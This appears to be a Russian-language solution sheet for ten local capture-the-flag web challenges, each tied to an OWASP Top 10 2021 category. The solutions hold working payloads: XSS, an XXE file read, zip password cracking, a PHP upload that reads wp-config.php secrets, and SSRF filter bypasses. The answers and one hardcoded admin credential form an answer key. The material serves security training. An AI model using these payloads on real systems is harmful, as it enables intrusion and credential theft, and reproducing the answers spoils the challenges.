1 Broken Access Control
Описание: Я нашел интересный сайт, но никак не могу найти то, что мне нужно. Возможно нужно спросить у админа?
Run: docker run -d -p 5000:5000 bac_rate 

localhost:5000

Solve: куки role = admin (в base64)

2. A02:2021-Cryptographic Failures
Описание: Мы нашли на сайте секретный архив secret.zip, защищенный паролем! Помоги нам узнать секреты которые скрывает от нас компания...
RUN: secret.zip
Solve: брутфорс пароля
	fcrackzip -v -u -b -c 'a' -l 4-6 secret.zip
			или
	zip2john secret.zip > hash.txt
	john --format=PKZIP --incremental=Alpha hash.txt
TODO: закинуть сертификат в зип и добавить ему сертификат

3. A03:2021-Injection   
Описание: Сайт, который поздравляет тебя с днем рождения, это круто, но еще круче сайт с XSS
RUN: docker run -p 3000:3000 xsss

localhost:3000

Solve: XSS в URL encoding
	Например - %3Cscript%3Ealert%28%221%22%29%3C%2Fscript%3E

4. A04:2021-Insecure Design 
Описание: Красивая страница авторизации, может быть не такой безопасной...
RUN: docker run -p 80:80 insecure_design

localhost:80

Solve: Посмотреть код страницы

5. A05:2021-Security Misconfiguration 
RUN: docker run -d -p 8080:80 sec_misconfig

localhost:8080

Solve: 
solution.xml:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<root>
    <firstname>John</firstname>
    <phonenumber>1234567890</phonenumber>
    <emailadd>&xxe;</emailadd>
</root>

$curl -X POST -d @solution.xml http://localhost:8080/xxe.php --header "Content-Type: text/xml"

6. A06:2021-Vulnerable and Outdated Components
Описание: Джон постоянно твердит всем, что он такой хороший fullstack сисадмин devop, но вы преподадите ему урок. Пристыдите его, узнав пароль к базе данных сайта.
admin user credentials are NJDZgw$K0lR0bK9R%*
RUN: sudo docker-compose up --build

localhost:30100

Solve:
Быстрый просмотр известных путей Wordpress, присутствующих в любой инсталляции, обнаружит каталог /wp-content/plugins, который, по совпадению, является распространенным источником проблем.

Вы сразу же заметите файл upload.html, который позволяет загружать файлы без ограничений по содержимому и расширению файлов и выводит обратно место, куда файл был скопирован, прямо в корень документа.

Вам просто нужно загрузить PHP-файл, который читает файл wp-config.php и считывает содержимое переменной DB_PASSWORD. Вы можете легко сделать это с помощью этого файла:

<?php
echo file_get_contents(«.../.../wp-config.php»);
?>
Затем просто зайдите в загруженный файл, что-то вроде /uploads/hiden_<random_id1>/<random_id2>.php и просмотрите источник страницы.

7. A07:2021-Identification and Authentication Failures 
Описание: Ты агент под прикрытием, работающий на секретную организацию. Твоя миссия: взломать систему аутентификации и получить доступ к тайным данным. Но будь осторожен, система охраняется опытными программистами, которые считают, что их защита непробиваема, а код идеален...
RUN: docker run -p 5000:5000 ctf-auth-failure
Solve: Переходи в /source и находи хэш пароля админа, расшифровываем его и заходим с его помощью.

8. A08:2021-Software and Data Integrity Failures
Описание: В вашем распоряжении оказалась информация о том, что таинственная организация "Data Keepers" разработала систему, которая позволяет проверять целостность загружаемых файлов. Ваша задача - проникнуть в эту систему, обойти её механизмы защиты и получить секретный флаг.
RUN: docker-compose up -d --build

localhost:9000

Solve: Откройте главную страницу CTF челленджа.
Перейдите на страницу загрузки файлов.
Обратите внимание на подсказку и найдите MD5 хэш.
Создайте файл solution.txt с содержимым "hello".
import hashlib

hash_object = hashlib.md5(b'hello')
print(hash_object.hexdigest())

echo -n "hello" > solution.txt

Загрузите файл на сервер.

9. A09:2021-Security Logging and Monitoring Failures
Описание: Вы — член элитной команды хакеров, известной своими успешными взломами и исследованиями уязвимостей. Недавно ваша команда получила доступ к сети крупной корпорации, известной своими высокими стандартами безопасности. Однако, проникнув в их защищенную среду, вы обнаружили серьезные проблемы с мониторингом и логированием безопасности.
RUN: docker run -p 1000:1000 logging

localhost:1000

Solve: Пользователь находит директорию /logs, в ней он находит логин и пароль админа и информацию о том, что он переходил в директорию /secret_logs, доступную только ему. Пользователь авторизуется с кредами админа и переходит в секретные логи, где есть запись о создании файла flag.txt и его значение в base64, он его декодирует и получает готовый флаг.

10. A10:2021-Server-Side Request Forgery 
Описание: Вы член группы хакеров, известной своими уникальными методами взлома. Ваша следующая цель — использовать уязвимость Server-Side Request Forgery (SSRF) для доступа к защищенному флагу, который находится на внутреннем сервере.
RUN: docker run -p 2000:2000 ssrf

localhost:2000

Solve:
Веб-приложение фильтрует запросы к локальным адресам и некоторым известным форматам, таким как localhost, 127.0.0.1, 0.0.0.0 и их эквивалентам в различных форматах.
Используйте различные способы представления IP адресов (127.0.0.1, 0.0.0.0, 2130706433, 0x7f000001 и т.д.) для обхода фильтров.
curl -X POST -d 'url=http://2130706433:1729/' http://localhost:2000/proxy

*Подсказка относится к "Такси Харди" - знаменитому математическому анекдоту, связанному с числом 1729.


